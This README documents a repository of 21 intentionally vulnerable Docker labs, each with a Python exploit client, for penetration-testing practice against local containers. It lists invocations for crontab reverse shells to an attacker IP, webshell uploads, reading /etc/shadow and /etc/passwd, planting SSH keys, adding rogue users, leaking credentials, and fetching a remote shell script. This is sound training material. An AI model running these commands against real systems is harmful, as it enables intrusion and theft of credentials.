# 🔒 Vulnerable Labs — Security Testing & Exploit Research Platform

[![CI](https://github.com/RiOxFRANKY/Vulnerable_labs/actions/workflows/ci.yml/badge.svg)](https://github.com/RiOxFRANKY/Vulnerable_labs/actions/workflows/ci.yml)

> A comprehensive collection of **20 intentionally vulnerable environments** with Docker-based deployment and ready-to-use Python exploit clients for security research, penetration testing practice, and vulnerability reproduction.

---

## 📋 Table of Contents

- [System Architecture](#-system-architecture)
- [Workflow Overview](#-workflow-overview)
- [Prerequisites](#-prerequisites)
- [Quick Start](#-quick-start)
- [Lab Catalog](#-lab-catalog)
  - [Web Application Vulnerabilities](#web-application-vulnerabilities)
  - [Infrastructure & Service Vulnerabilities](#infrastructure--service-vulnerabilities)
  - [Java Framework Vulnerabilities](#java-framework-vulnerabilities)
  - [Database & Cache Vulnerabilities](#database--cache-vulnerabilities)
- [Detailed Lab Instructions](#-detailed-lab-instructions)
- [Server Script Verification](#-server-script-verification)
- [DevOps / CI Pipeline](#-devops--ci-pipeline)
- [Troubleshooting](#-troubleshooting)
- [Disclaimer](#%EF%B8%8F-disclaimer)

---

## 🏗 System Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         HOST MACHINE (Your PC)                         │
│                                                                        │
│  ┌──────────────────┐     ┌──────────────────────────────────────────┐ │
│  │  Python Client    │     │        Docker Engine                     │ │
│  │  (client.py)      │     │                                          │ │
│  │                   │     │  ┌────────────────────────────────────┐  │ │
│  │  ┌─────────────┐ │     │  │     Vulnerable Service Container   │  │ │
│  │  │  requests    │ │ HTTP│  │                                    │  │ │
│  │  │  socket      │─┼─────┼──│  ┌──────────┐   ┌──────────────┐  │  │ │
│  │  │  argparse    │ │     │  │  │ Vuln App  │   │  Database /  │  │  │ │
│  │  └─────────────┘ │     │  │  │ (GitLab,  │   │  Backend     │  │  │ │
│  │                   │     │  │  │  Jenkins, │◄──│  (Postgres,  │  │  │ │
│  │  Modes:           │     │  │  │  Tomcat,  │   │   MySQL,     │  │  │ │
│  │  - check          │     │  │  │  etc.)    │   │   Redis)     │  │  │ │
│  │  - exploit        │     │  │  └──────────┘   └──────────────┘  │  │ │
│  │  - shell          │     │  └────────────────────────────────────┘  │ │
│  │  - info           │     │                                          │ │
│  └──────────────────┘     └──────────────────────────────────────────┘ │
│                                                                        │
│  Exposed Ports: 5601, 6379, 7001, 8080, 8090, 8161, 8848, 8983,      │
│                 9000, 9200, 10911, 2375, etc.                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Component Breakdown

```
Vulnerable_labs/
├── README.md                    # ← You are here (Master documentation)
├── requirements.txt             # Python dependencies for all clients
├── <service_name>/              # Service category folder
│   └── <CVE-ID>/                # Specific vulnerability folder
│       ├── docker-compose.yml   # Server - Spins up the vulnerable environment
│       ├── Dockerfile           # (Some labs) Custom container build
│       ├── README.md            # Original vulnerability documentation
│       ├── client.py            # Client - Python exploit script
│       ├── poc.py / exploit.py  # (Some labs) Original PoC scripts
│       └── *.png                # Screenshots and evidence
└── ...
```

---

## 🔄 Workflow Overview

```
┌──────────┐     ┌───────────┐     ┌──────────────┐     ┌────────────┐
│  Step 1   │     │  Step 2    │     │   Step 3      │     │  Step 4    │
│           │     │            │     │               │     │            │
│  Install  │────▶│   Start    │────▶│  Run Client   │────▶│  Analyze   │
│  Prereqs  │     │   Server   │     │  (Exploit)    │     │  Results   │
│           │     │            │     │               │     │            │
│ • Docker  │     │ docker     │     │ python        │     │ • Verify   │
│ • Python  │     │ compose    │     │ client.py     │     │   RCE      │
│ • pip     │     │ up -d      │     │ <target>      │     │ • Check    │
│           │     │            │     │ --mode exploit│     │   files    │
└──────────┘     └───────────┘     └──────────────┘     └────────────┘
                       │                    │                    │
                       ▼                    ▼                    ▼
              Vulnerable service     Exploit payload      docker exec
              starts on mapped       sent to target       to verify
              port (e.g. 8080)       via HTTP/TCP          results
```

### Detailed Workflow

1. **Install Prerequisites** — Docker, Docker Compose, Python 3, and the `requests` library.
2. **Navigate** to the specific vulnerability directory (e.g., `cd gitlab/CVE-2021-22205`).
3. **Start the Server** — Run `docker compose up -d` to launch the vulnerable container.
4. **Wait for Initialization** — Some services (GitLab, Magento) need 2–5 minutes to fully start.
5. **Run the Client** — Execute `python client.py http://localhost:<PORT>` with appropriate flags.
6. **Verify Results** — Use `docker compose exec <service> <command>` to confirm exploitation.
7. **Tear Down** — Run `docker compose down` to stop and remove containers.

---

## 📦 Prerequisites

| Requirement | Minimum Version | Install Command |
|---|---|---|
| **Docker** | 20.10+ | [Install Docker](https://docs.docker.com/get-docker/) |
| **Docker Compose** | v2.0+ | Bundled with Docker Desktop |
| **Python** | 3.6+ | [Install Python](https://www.python.org/downloads/) |
| **pip** | 20.0+ | Comes with Python |

---

## 🚀 Quick Start

```bash
# 1. Clone the repository
git clone https://github.com/Melodictreacle/Vulnerable_labs.git
cd Vulnerable_labs

# 2. Install Python dependencies
pip install -r requirements.txt

# 3. Pick a lab (example: Struts2 S2-045)
cd struts2/s2-045

# 4. Start the vulnerable server
docker compose up -d

# 5. Wait for startup, then run the exploit client
python client.py http://localhost:8080 --cmd "id"

# 6. Clean up when done
docker compose down
```

---

## 📚 Lab Catalog

### Web Application Vulnerabilities

| # | Service | CVE / ID | Vulnerability | Port | Severity |
|---|---|---|---|---|---|
| 1 | **Confluence** | CVE-2022-26134 | Pre-Auth OGNL Injection RCE | 8090 | 🔴 Critical |
| 2 | **Drupal** | CVE-2018-7600 | Drupalgeddon 2 (Unauthenticated RCE) | 8080 | 🔴 Critical |
| 3 | **GitLab** | CVE-2021-22205 | Pre-Auth RCE via ExifTool | 8080 | 🔴 Critical |
| 4 | **Magento** | 2.2-sqli | SQL Injection (Boolean Blind) | 8080 | 🟠 High |
| 5 | **phpMyAdmin** | CVE-2018-12613 | Local File Inclusion | 8080 | 🟠 High |
| 6 | **WordPress** | PwnScriptum | RCE via PHPMailer (CVE-2016-10033) | 8080 | 🔴 Critical |

### Infrastructure & Service Vulnerabilities

| # | Service | CVE / ID | Vulnerability | Port | Severity |
|---|---|---|---|---|---|
| 7 | **ActiveMQ** | CVE-2016-3088 | Arbitrary File Write via FileServer | 8161 | 🔴 Critical |
| 8 | **Docker** | Unauthorized RCE | Exposed Docker API (No Auth) | 2375 | 🔴 Critical |
| 9 | **Jenkins** | CVE-2018-1000861 | RCE via Groovy Meta-Programming | 8080 | 🔴 Critical |
| 10 | **Kibana** | CVE-2019-7609 | Prototype Pollution → RCE | 5601 | 🔴 Critical |
| 11 | **MinIO** | CVE-2023-28432 | Information Disclosure (Cluster) | 9000 | 🟠 High |
| 12 | **Nacos** | CVE-2021-29441 | Authentication Bypass | 8848 | 🔴 Critical |
| 13 | **Nexus** | CVE-2019-7238 | Unauthenticated JEXL Injection RCE | 8081 | 🔴 Critical |
| 14 | **Redis** | 4.x Unauth | Post-Exploitation via Master-Slave | 6379 | 🔴 Critical |
| 15 | **RocketMQ** | CVE-2023-33246 | Broker RCE via Config Update | 10911 | 🔴 Critical |

### Java Framework Vulnerabilities

| # | Service | CVE / ID | Vulnerability | Port | Severity |
|---|---|---|---|---|---|
| 16 | **ElasticSearch** | CVE-2015-1427 | Groovy Sandbox Bypass RCE | 9200 | 🔴 Critical |
| 17 | **Solr** | CVE-2019-17558 | Velocity Template Injection RCE | 8983 | 🔴 Critical |
| 18 | **Spring** | CVE-2022-22965 | Spring4Shell Data Binding RCE | 8080 | 🔴 Critical |
| 19 | **Struts2** | S2-045 | OGNL Injection via Content-Type | 8080 | 🔴 Critical |
| 20 | **Tomcat** | CVE-2017-12615 | Arbitrary File Write via PUT | 8080 | 🟠 High |

### Other

| # | Service | CVE / ID | Vulnerability | Port | Severity |
|---|---|---|---|---|---|
| 21 | **WebLogic** | CVE-2020-14882 | Pre-Auth Console Bypass + RCE | 7001 | 🔴 Critical |

---

## 📖 Detailed Lab Instructions

### 1. ActiveMQ — CVE-2016-3088 (Arbitrary File Write)

```bash
cd activemq/CVE-2016-3088
docker compose up -d
# Access web console: http://localhost:8161 (admin:admin)

# Check if target is vulnerable
python client.py http://localhost:8161 --mode check

# Exploit via webshell upload
python client.py http://localhost:8161 --mode webshell

# Exploit via crontab reverse shell
python client.py http://localhost:8161 --mode crontab --attacker-ip YOUR_IP --attacker-port 4444
```

---

### 2. Confluence — CVE-2022-26134 (OGNL Injection)

```bash
cd confluence/CVE-2022-26134
docker compose up -d
# Complete installation at http://localhost:8090 (needs Atlassian trial license)
# Database: host=db, name=confluence, user=postgres, password=postgres

# Execute a command
python client.py http://localhost:8090 --cmd "id"

# Interactive shell
python client.py http://localhost:8090 --shell
```

---

### 3. Docker — Unauthorized RCE

```bash
cd docker/unauthorized-rce
docker compose build && docker compose up -d
# Docker API exposed on port 2375

# Check access
python client.py http://localhost:2375 --mode check

# List containers and images
python client.py http://localhost:2375 --mode info

# Execute command with host filesystem access
python client.py http://localhost:2375 --mode exec --cmd "cat /host/etc/shadow"

# Reverse shell via crontab
python client.py http://localhost:2375 --mode crontab --attacker-ip YOUR_IP
```

---

### 4. Drupal — CVE-2018-7600 (Drupalgeddon 2)

```bash
cd drupal/CVE-2018-7600
docker compose up -d
# Complete Drupal installation at http://localhost:8080 (use SQLite)

# Execute command
python client.py http://localhost:8080 --cmd "id"

# Interactive shell
python client.py http://localhost:8080 --shell
```

---

### 5. ElasticSearch — CVE-2015-1427 (Groovy Sandbox Bypass)

```bash
cd elasticsearch/CVE-2015-1427
docker compose up -d
# API available at http://localhost:9200

# Setup index and exploit with Java sandbox bypass
python client.py http://localhost:9200 --setup --cmd "id" --method java

# Groovy native method
python client.py http://localhost:9200 --cmd "id" --method groovy

# Interactive shell
python client.py http://localhost:9200 --setup --shell
```

---

### 6. GitLab — CVE-2021-22205 (Pre-Auth RCE)

```bash
cd gitlab/CVE-2021-22205
docker compose up -d
# Wait ~3-5 minutes for GitLab to start at http://localhost:8080
# Login: root / vulhub123456

# Execute command (blind)
python client.py http://localhost:8080 --cmd "touch /tmp/success"

# Verify: docker compose exec gitlab ls /tmp/success

# Interactive shell
python client.py http://localhost:8080 --shell
```

---

### 7. Jenkins — CVE-2018-1000861 (Groovy Meta-Programming RCE)

```bash
cd jenkins/CVE-2018-1000861
docker compose up -d
# Jenkins at http://localhost:8080

# Execute command
python client.py http://localhost:8080 --cmd "touch /tmp/success"

# Interactive shell
python client.py http://localhost:8080 --shell
```

> **Note:** The original `poc.py` is Python 2. The new `client.py` is the Python 3 rewrite.

---

### 8. Kibana — CVE-2019-7609 (Prototype Pollution RCE)

```bash
# IMPORTANT: Set host kernel parameter first
sudo sysctl -w vm.max_map_count=262144

cd kibana/CVE-2019-7609
docker compose up -d
# Kibana at http://localhost:5601

# Inject payload and trigger
python client.py http://localhost:5601 --cmd "/bin/touch /tmp/success" --trigger
```

> **Note:** This is a multi-step exploit. After injection, you must visit the Canvas page.

---

### 9. Magento — 2.2 SQL Injection

```bash
cd magento/2.2-sqli
docker compose up -d
# Complete installation at http://localhost:8080
# Database: host=mysql, user=root, password=root

# Check for SQLi vulnerability
python client.py http://localhost:8080 --mode check

# Extract database user
python client.py http://localhost:8080 --mode extract --query "SELECT user()"
```

---

### 10. MinIO — CVE-2023-28432 (Information Disclosure)

```bash
cd minio/CVE-2023-28432
docker compose up -d
# API: http://localhost:9000, Console: http://localhost:9001

# Leak environment variables (credentials)
python client.py http://localhost:9000

# Also attempt login with leaked credentials
python client.py http://localhost:9000 --login
```

---

### 11. Nacos — CVE-2021-29441 (Auth Bypass)

```bash
cd nacos/CVE-2021-29441
docker compose up -d
# Nacos at http://localhost:8848/nacos/

# Check vulnerability and list users
python client.py http://localhost:8848 --mode check

# Add a new user
python client.py http://localhost:8848 --mode add-user --username hacker --password hacker123

# List all configurations
python client.py http://localhost:8848 --mode list-configs
```

---

### 12. Nexus — CVE-2019-7238 (JEXL Injection RCE)

```bash
cd nexus/CVE-2019-7238
docker compose up -d
# Nexus at http://localhost:8081 (admin:admin123)
# Upload at least one package via maven-releases first

# Execute command (blind)
python client.py http://localhost:8081 --cmd "touch /tmp/success"

# Interactive shell
python client.py http://localhost:8081 --shell
```

---

### 13. phpMyAdmin — CVE-2018-12613 (Local File Inclusion)

```bash
cd phpmyadmin/CVE-2018-12613
docker compose up -d
# phpMyAdmin at http://localhost:8080 (auto-login, config mode)

# Read /etc/passwd
python client.py http://localhost:8080 --mode read --file "/etc/passwd"

# Execute PHP code via session injection
python client.py http://localhost:8080 --mode exec --php "<?=phpinfo()?>"
```

---

### 14. Redis — 4.x Unauthorized Access

```bash
cd redis/4-unacc
docker compose up -d
# Redis on port 6379 (no authentication)

# Check access
python client.py localhost --mode check

# Get server info
python client.py localhost --mode info

# Write SSH key
python client.py localhost --mode ssh --ssh-key-file ~/.ssh/id_rsa.pub

# Reverse shell via crontab
python client.py localhost --mode crontab --attacker-ip YOUR_IP
```

---

### 15. RocketMQ — CVE-2023-33246 (Broker RCE)

```bash
cd rocketmq/CVE-2023-33246
docker compose up -d
# Broker on port 10911

# Check connectivity
python client.py localhost --mode check

# Exploit (recommend using the Java tool for reliability)
python client.py localhost --mode exploit --cmd "touch /tmp/success"
```

---

### 16. Solr — CVE-2019-17558 (Velocity Template RCE)

```bash
cd solr/CVE-2019-17558
docker compose up -d
# Solr at http://localhost:8983

# Auto-detect core and exploit
python client.py http://localhost:8983 --cmd "id"

# Interactive shell
python client.py http://localhost:8983 --shell
```

---

### 17. Spring — CVE-2022-22965 (Spring4Shell)

```bash
cd spring/CVE-2022-22965
docker compose up -d
# App at http://localhost:8080

# Deploy webshell
python client.py http://localhost:8080 --mode exploit

# Execute commands via webshell
python client.py http://localhost:8080 --mode exec --cmd "id"

# Interactive shell
python client.py http://localhost:8080 --mode shell
```

---

### 18. Struts2 — S2-045 (CVE-2017-5638)

```bash
cd struts2/s2-045
docker compose up -d
# App at http://localhost:8080

# Check vulnerability
python client.py http://localhost:8080 --check-only

# Execute command with output
python client.py http://localhost:8080 --cmd "id"

# Interactive shell
python client.py http://localhost:8080 --shell
```

---

### 19. Tomcat — CVE-2017-12615 (PUT File Write)

```bash
cd tomcat/CVE-2017-12615
docker compose build && docker compose up -d
# Tomcat at http://localhost:8080

# Check if PUT is enabled
python client.py http://localhost:8080 --mode check

# Upload webshell
python client.py http://localhost:8080 --mode exploit

# Interactive shell via webshell
python client.py http://localhost:8080 --mode shell
```

---

### 20. WebLogic — CVE-2020-14882/14883 (Pre-Auth RCE)

```bash
cd weblogic/CVE-2020-14882
docker compose up -d
# WebLogic console at http://localhost:7001/console

# Check auth bypass
python client.py http://localhost:7001 --mode check

# Execute via ShellSession (12.2.1+ only)
python client.py http://localhost:7001 --mode shell-session --cmd "touch /tmp/success"

# Generate XML payload for older versions
python client.py http://localhost:7001 --mode generate-xml --cmd "bash -c touch /tmp/success"

# Interactive shell
python client.py http://localhost:7001 --mode shell
```

---

### 21. WordPress — PwnScriptum (CVE-2016-10033)

```bash
cd wordpress/pwnscriptum
docker compose up -d
# Complete WordPress setup at http://localhost:8080

# Check target
python client.py http://localhost:8080 --mode check

# Touch a file to verify RCE
python client.py http://localhost:8080 --mode touch --user admin

# Reverse shell (host your shell script first)
python client.py http://localhost:8080 --mode reverse-shell --shell-url example.com/shell.sh
```

---

## ✅ Server Script Verification

All `docker-compose.yml` files have been cross-checked for correctness:

| Lab | Image | Ports | Dependencies | Status |
|---|---|---|---|---|
| ActiveMQ | `vulhub/activemq:5.11.1-with-cron` | 61616, 8161 | None | ✅ Valid |
| Confluence | `vulhub/confluence:7.13.6` | 8090 | PostgreSQL 12.8 | ✅ Valid |
| Docker | `vulhub/docker:28.0.1` (custom build) | 2375 | None (privileged) | ✅ Valid |
| Drupal | `vulhub/drupal:8.5.0` | 8080 | None (SQLite) | ✅ Valid |
| ElasticSearch | `vulhub/elasticsearch:1.4.2` | 9200, 9300 | None | ✅ Valid |
| GitLab | `vulhub/gitlab:13.10.1` | 8080, 10022 | Redis, PostgreSQL | ✅ Valid |
| Jenkins | `vulhub/jenkins:2.138` | 8080, 50000 | None | ✅ Valid |
| Kibana | `vulhub/kibana:6.5.4` | 5601 | ElasticSearch 6.8.6 | ✅ Valid |
| Magento | `vulhub/magento:2.2.7` | 8080 | MySQL 5.7 | ✅ Valid |
| MinIO | `vulhub/minio:2023-02-27T18-10-45Z` | 9000, 9001 | 3-node cluster | ✅ Valid |
| Nacos | `vulhub/nacos:1.4.0` | 8848, 5005 | None | ✅ Valid |
| Nexus | `vulhub/nexus:3.14.0` | 8081, 5005 | None | ✅ Valid |
| phpMyAdmin | `vulhub/phpmyadmin:4.8.1` | 8080 | MySQL 5.5 | ✅ Valid |
| Redis | `vulhub/redis:4.0.14` | 6379 | None | ✅ Valid |
| RocketMQ | `vulhub/rocketmq:5.1.0` | 10911, 5005 | None | ✅ Valid |
| Solr | `vulhub/solr:8.2.0` | 8983, 5005 | None | ✅ Valid |
| Spring | `vulhub/spring-webmvc:5.3.17` | 8080 | None | ✅ Valid |
| Struts2 | `vulhub/struts2:2.3.30` | 8080 | None | ✅ Valid |
| Tomcat | `vulhub/tomcat:8.5.19` (custom build) | 8080 | None | ✅ Valid |
| WebLogic | `vulhub/weblogic:12.2.1.3-2018` | 7001 | None | ✅ Valid |
| WordPress | `vulhub/wordpress:4.6` | 8080 | MySQL 5 | ✅ Valid |

### Notes on Server Configurations

- **Port Conflicts:** Several labs use port `8080`. Only run **one lab at a time** or modify the port mapping in `docker-compose.yml`.
- **GitLab** takes 3-5 minutes to fully start. Check with `docker compose logs -f gitlab`.
- **Kibana** requires the host kernel parameter `vm.max_map_count=262144`.
- **Tomcat & Docker** labs require `docker compose build` before `docker compose up -d`.
- **Confluence & Magento** require manual installation wizards after starting.

---

## 🛠 DevOps / CI Pipeline

A GitHub Actions pipeline ([.github/workflows/ci.yml](.github/workflows/ci.yml))
runs on every push and pull request to `main`. Because the labs are vulnerable
**by design**, CI does not scan the lab images for CVEs — it keeps the exploit
clients and infrastructure files healthy:

| Check | Tool | Purpose |
|---|---|---|
| Python lint | `ruff` | Catch real defects in the exploit clients |
| Python syntax | `py_compile` (3.8 + 3.12) | Every client compiles cleanly |
| Compose validation | `docker compose config` | All 21 `docker-compose.yml` files are valid |
| Dockerfile lint | `hadolint` | Custom Dockerfiles have no hard errors |
| Shell lint | `shellcheck` | Entrypoint / helper scripts are clean |
| YAML lint | `yamllint` | Repository-owned YAML is well-formed |
| Secret scan | `gitleaks` | No real secrets committed (demo creds allowlisted) |

Run the same checks locally:

```bash
make install   # ruff, yamllint, pre-commit + git hooks
make ci        # run the whole pipeline
```

Or enable pre-commit hooks so checks run automatically before each commit:

```bash
pip install pre-commit && pre-commit install
```

See [CONTRIBUTING.md](CONTRIBUTING.md) for the full breakdown and conventions
(e.g. why the Jenkins `poc.py` and the pinned vulnerable images are left as-is).

---

## 🔧 Troubleshooting

| Issue | Solution |
|---|---|
| Port already in use | Stop other labs: `docker compose down` in their directory |
| Container exits immediately | Check logs: `docker compose logs <service>` |
| GitLab won't start | Give it 3-5 min; check: `docker compose logs -f gitlab` |
| Python module not found | Run `pip install -r requirements.txt` |
| Connection refused | Wait for service to start; check `docker compose ps` |
| `vm.max_map_count` error | Run `sudo sysctl -w vm.max_map_count=262144` |
| Exploit returns no output | Some exploits are blind; verify via `docker compose exec` |

---

## ⚠️ Disclaimer

> **FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING PURPOSES ONLY.**
>
> This repository contains intentionally vulnerable applications and exploit code. These tools are designed for:
> - Security research and education
> - Authorized penetration testing practice
> - Vulnerability reproduction in isolated environments
>
> **Do NOT use these tools against systems you do not own or have explicit authorization to test.** Unauthorized access to computer systems is illegal. The authors are not responsible for any misuse of these tools.
>
> Always run vulnerable labs in **isolated network environments** (e.g., Docker with host-only networking).
